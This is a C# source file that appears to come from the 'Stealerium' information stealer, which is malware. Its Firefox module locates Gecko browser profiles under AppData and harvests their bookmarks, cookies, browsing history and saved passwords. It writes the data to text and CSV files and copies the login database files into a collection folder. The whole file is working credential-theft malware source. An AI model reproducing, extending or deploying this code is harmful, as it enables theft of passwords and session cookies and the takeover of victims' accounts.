using System;
using System.IO;
using Stealerium.Stub.Helpers;

namespace Stealerium.Stub.Target.Browsers.Firefox
{
    internal sealed class RecoverFirefox
    {
        public static void Run(string sSavePath)
        {
            foreach (var path in Paths.SGeckoBrowserPaths)
                try
                {
                    var name = new DirectoryInfo(path).Name;
                    var bSavePath = sSavePath + "\\" + name;
                    var browser = Paths.Appdata + "\\" + path;

                    if (Directory.Exists(browser + "\\Profiles"))
                    {
                        Directory.CreateDirectory(bSavePath);

                        var bookmarks = CBookmarks.Get(browser); // Read all Firefox bookmarks
                        var cookies = CCookies.Get(browser); // Read all Firefox cookies
                        var history = CHistory.Get(browser); // Read all Firefox history
                        var passwords = CPasswords.Get(browser); // Read all Firefox passwords

                        CBrowserUtils.WriteBookmarks(bookmarks, bSavePath + "\\Bookmarks.txt");
                        CBrowserUtils.WriteCookies(cookies, bSavePath + "\\Cookies.txt");
                        CBrowserUtils.WriteHistory(history, bSavePath + "\\History.txt");
                        CBrowserUtils.WritePasswordsToTxt(passwords, bSavePath + "\\Passwords.txt");
                        CBrowserUtils.WritePasswordsToCsv(passwords, bSavePath + "\\Passwords.csv");
                        // Create a README.txt file in the directory
                        CBrowserUtils.CreateReadme(bSavePath);
                        // Copy all Firefox logins
                        CLogins.GetDbFiles(browser + "\\Profiles\\", bSavePath);
                    }
                }
                catch (Exception ex)
                {
                    Logging.Log("Firefox >> Failed to recover data\n" + ex);
                }
        }
    }
}